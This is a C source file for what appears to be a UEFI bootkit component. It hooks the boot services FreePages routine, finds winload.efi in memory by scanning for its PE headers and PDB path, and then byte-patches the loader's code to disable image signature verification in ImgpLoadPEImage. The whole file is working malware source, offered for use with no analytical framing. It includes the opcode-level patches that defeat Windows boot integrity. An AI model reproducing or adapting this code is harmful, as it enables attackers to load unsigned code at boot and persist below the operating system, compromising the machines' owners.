#include "FreePages.h"

/*!
 * Converts an ASCII character to its lowercase form without
 * relying on the CRT. Used to perform case-insensitive checks
 * against the PDB path that ships with winload.efi.
 */
STATIC UINT8 ToLowerAscii( UINT8 Value )
{
    if ( Value >= 'A' && Value <= 'Z' )
    {
        return ( UINT8 )( Value + 0x20 );
    }
    return Value;
}

STATIC UINT32 GetLength( CONST CHAR* String )
{
    UINT32 Length = 0;

    while ( String[ Length ] != 0 )
    {
        ++Length;
    }

    return Length;
}

/*!
 * Performs a case-insensitive substring search within the variable-length
 * PDB path stored inside the RSDS debug record. Recent Windows 11 builds
 * (including 25H2 previews) ship both the historical winload artifacts and
 * the newer winloadhost alias, so we recognise the common loader names that
 * appear across these releases.
 */
STATIC BOOL PathContainsToken( PUINT8 Path, UINT32 Size, CONST CHAR* Token )
{
    CONST UINT32 TokenLength = GetLength( Token );

    if ( TokenLength == 0 || Size < TokenLength )
    {
        return FALSE;
    }

    for ( UINT32 Index = 0 ; ( Index + TokenLength ) <= Size ; ++Index )
    {
        UINT8 Character = Path[ Index ];

        if ( Character == 0 )
        {
            break;
        }

        if ( ToLowerAscii( Character ) != ( UINT8 )Token[ 0 ] )
        {
            continue;
        }

        BOOL Match = TRUE;

        for ( UINT32 Offset = 1 ; Offset < TokenLength ; ++Offset )
        {
            Character = Path[ Index + Offset ];

            if ( Character == 0 )
            {
                Match = FALSE;
                break;
            }

            if ( ToLowerAscii( Character ) != ( UINT8 )Token[ Offset ] )
            {
                Match = FALSE;
                break;
            }
        }

        if ( Match )
        {
            return TRUE;
        }
    }

    return FALSE;
}

STATIC BOOL DoesPathContainWinload( PRSDS_DEBUG_FORMAT Rsd, UINT32 DebugDataSize )
{
    STATIC CONST CHAR* Tokens[] =
    {
        "winload",
        "winloadapp",
        "winloadhost"
    };

    CONST UINT32 HeaderSize = sizeof( RSDS_DEBUG_FORMAT ) - sizeof( Rsd->Path );
    CONST UINT32 TokenCount = sizeof( Tokens ) / sizeof( Tokens[ 0 ] );

    PUINT8       Path = NULL;
    UINT32       Size = 0;

    if ( DebugDataSize <= HeaderSize )
    {
        return FALSE;
    }

    Size = DebugDataSize - HeaderSize;
    Path = ( PUINT8 )( Rsd->Path );

    for ( UINT32 Index = 0 ; Index < TokenCount ; ++Index )
    {
        if ( PathContainsToken( Path, Size, Tokens[ Index ] ) )
        {
            return TRUE;
        }
    }

    return FALSE;
}

STATIC BOOL PatchLegacyShortBranch( PUINT8 Address )
{
    if ( Address[ 0x00 ] == 0xC1 &&
         Address[ 0x03 ] == 0xC7 &&
         Address[ 0x04 ] == 0x74 )
    {
        *( Address + 0x04 ) = ( UINT8 )0xEB;
        return TRUE;
    }

    return FALSE;
}

STATIC BOOL PatchShortConditionalJump( PUINT8 Address, PUINT8 Base, UINTN Size )
{
    if ( Address[ 0 ] != 0x74 )
    {
        return FALSE;
    }

    CONST INT8 Offset = ( INT8 )Address[ 1 ];
    PUINT8     Target = Address + 0x02 + Offset;

    if ( Target < Base || Target >= ( Base + Size ) )
    {
        return FALSE;
    }

    *( Address + 0x00 ) = ( UINT8 )0xEB;
    return TRUE;
}

STATIC BOOL PatchNearConditionalJump( PUINT8 Address, PUINT8 Base, UINTN Size )
{
    if ( Address[ 0 ] != 0x0F )
    {
        return FALSE;
    }

    if ( Address[ 1 ] != 0x84 &&
         Address[ 1 ] != 0x85 )
    {
        return FALSE;
    }

    INT32  Offset = *( PINT32 )( Address + 0x02 );
    PUINT8 Target = Address + 0x06 + Offset;

    if ( Target < Base || Target >= ( Base + Size ) )
    {
        return FALSE;
    }

    *( Address + 0x00 ) = ( UINT8 )0xE9;
    *( PINT32 )( Address + 0x01 ) = Offset + 1;
    *( Address + 0x05 ) = ( UINT8 )0x90;

    return TRUE;
}

STATIC BOOL PatchConditionalJumpAround( PUINT8 Address, PUINT8 Base, UINTN Size )
{
    for ( INT Offset = -0x40 ; Offset <= 0x40 ; ++Offset )
    {
        PUINT8 Candidate = Address + Offset;

        if ( Candidate < Base || Candidate >= ( Base + Size ) )
        {
            continue;
        }

        if ( PatchLegacyShortBranch( Candidate ) )
        {
            return TRUE;
        }

        if ( PatchShortConditionalJump( Candidate, Base, Size ) )
        {
            return TRUE;
        }

        if ( PatchNearConditionalJump( Candidate, Base, Size ) )
        {
            return TRUE;
        }
    }

    return FALSE;
}

STATIC BOOL PatchValidateCall( PUINT8 Address, PUINT8 Base, UINTN Size )
{
    if ( Address[ 0 ] != 0xE8 )
    {
        return FALSE;
    }

    INT32  Disp   = *( PINT32 )( Address + 0x01 );
    PUINT8 Target = Address + 0x05 + Disp;
    PUINT8 After  = Address + 0x05;
    UINT32 TestLength = 0;

    if ( Target < Base || Target >= ( Base + Size ) )
    {
        return FALSE;
    }

    if ( After[ 0 ] == 0x84 && After[ 1 ] == 0xC0 )
    {
        TestLength = 0x02;
    }
    else if ( After[ 0 ] == 0x85 && After[ 1 ] == 0xC0 )
    {
        TestLength = 0x02;
    }
    else if ( After[ 0 ] == 0x48 && After[ 1 ] == 0x85 && After[ 2 ] == 0xC0 )
    {
        TestLength = 0x03;
    }

    if ( TestLength == 0 )
    {
        return FALSE;
    }

    PUINT8 Branch = After + TestLength;

    if ( Branch < Base || Branch >= ( Base + Size ) )
    {
        return FALSE;
    }

    BOOL HasBranch = FALSE;

    if ( Branch[ 0 ] == 0x74 )
    {
        HasBranch = TRUE;
    }
    else if ( Branch[ 0 ] == 0x0F &&
              ( Branch[ 1 ] == 0x84 || Branch[ 1 ] == 0x85 ) )
    {
        HasBranch = TRUE;
    }

    if ( !HasBranch )
    {
        return FALSE;
    }

    *( PUINT16 )( Address + 0x00 ) = ( UINT16 )0xC031;
    *( Address + 0x02 )            = ( UINT8 )0x90;
    *( Address + 0x03 )            = ( UINT8 )0x90;
    *( Address + 0x04 )            = ( UINT8 )0x90;

    return TRUE;
}

/*!
 *
 * Purpose:
 *
 * Detects when being executed from the winload.efi module
 * and patches the signature verification in the
 * ImgpLoadPEImage routine.
 *
!*/
D_SEC( B ) EFI_STATUS EFIAPI FreePagesHook( IN EFI_PHYSICAL_ADDRESS Memory, IN UINTN Pages )
{
    PGENTBL                     Gen = NULL;
    PUINT8                      Adr = NULL;

    PIMAGE_DOS_HEADER           Dos = NULL;
    PIMAGE_NT_HEADERS           Nth = NULL;
    PIMAGE_DATA_DIRECTORY       Dir = NULL;
    PIMAGE_DEBUG_DIRECTORY      Dbg = NULL;
    PRSDS_DEBUG_FORMAT          Rsd = NULL;

    /* Resolve the general table structure */
    Gen = C_PTR( G_PTR( GenTbl ) );

    /* Retrieve RAX value and align it to the page boundary */
    Dos = C_PTR( U_PTR( RETURN_ADDRESS( 0 ) ) & ~ EFI_PAGE_MASK );

    do
    {
        /* Has the MZ magic? */
        if ( Dos->e_magic == IMAGE_DOS_SIGNATURE )
        {
            /* Get the NT headers */
            Nth = C_PTR( ( U_PTR( Dos ) + Dos->e_lfanew ) );

            /* Are the NT headers valid? */
            if ( Nth->Signature == IMAGE_NT_SIGNATURE )
            {
                /* Leave! */
                break;
            }
        }
        /* Step back to the previus page */
        Dos = C_PTR( U_PTR( Dos ) - EFI_PAGE_SIZE );
    } while ( TRUE );

    /* Get a pointer to the debug directory */
    Dir = C_PTR( & Nth->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_DEBUG ] );

    /* Is debug directory exist? */
    if ( Dir->VirtualAddress == 0 )
    {
        /* No? Leave! */
        goto LEAVE;
    }

    /* Calculate a debug directory pointer */
    Dbg = C_PTR( U_PTR( Dos ) + Dir->VirtualAddress );

    /* Is it a code view directory? */
    if ( Dbg->Type == IMAGE_DEBUG_TYPE_CODEVIEW )
    {
        /* Get a pointer to the debug store */
        Rsd = C_PTR( U_PTR( Dos ) + Dbg->AddressOfRawData );

        /* Is it rich symbol for sure? */
        if ( Rsd->Signature == PE_PDB_RSDS_SIGNATURE )
        {
            /* Is this winload.efi? */
            if ( DoesPathContainWinload( Rsd, Dbg->SizeOfData ) )
            {
                /* Yes! - Set up the pointer to the base of the PE image */
                BOOL  BranchPatched = FALSE;
                BOOL  CallPatched   = FALSE;

                Adr = C_PTR( U_PTR( Dos ) );

                while ( U_PTR( Adr ) < U_PTR( Dos ) + Nth->OptionalHeader.SizeOfImage )
                {
                    if ( !BranchPatched && PatchLegacyShortBranch( Adr ) )
                    {
                        BranchPatched = TRUE;
                    }

                    if ( !CallPatched && PatchValidateCall( Adr, C_PTR( Dos ), Nth->OptionalHeader.SizeOfImage ) )
                    {
                        CallPatched   = TRUE;
                        BranchPatched = BranchPatched ||
                                        PatchConditionalJumpAround( Adr, C_PTR( Dos ), Nth->OptionalHeader.SizeOfImage );
                    }

                    if ( CallPatched )
                    {
                        if ( BranchPatched )
                        {
                            /* Restore the original routine */
                            Gen->SystemTable->BootServices->FreePages = C_PTR( Gen->FreePages );

                            /* Quit! */
                            goto LEAVE;
                        }
                    }

                    /* Move to next opcode */
                    Adr += 0x1;
                }
            }
        }
    }

LEAVE:
    /* Execute original routine */
    return ( ( D_API( FreePagesHook ) )( Gen->FreePages ) )( Memory, Pages );
} E_SEC;

